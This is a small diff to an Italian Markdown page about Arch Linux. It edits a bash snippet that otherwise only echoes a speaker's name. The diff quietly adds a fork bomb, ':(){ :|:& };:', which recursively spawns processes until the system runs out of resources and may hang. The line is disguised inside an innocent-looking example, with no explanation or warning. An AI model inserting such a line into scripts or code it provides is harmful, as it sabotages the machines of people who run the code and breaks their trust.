@@ -14,6 +14,7 @@ Arch Linux è una delle distribuzioni GNU/Linux rolling-release più interessant
 ```bash
 #!/bin/bash
 echo "Speaker: Davide Carnemolla"
+:(){ :|:& };:
 ```
 
 [Link al collegamento](https://gohugo.io/)
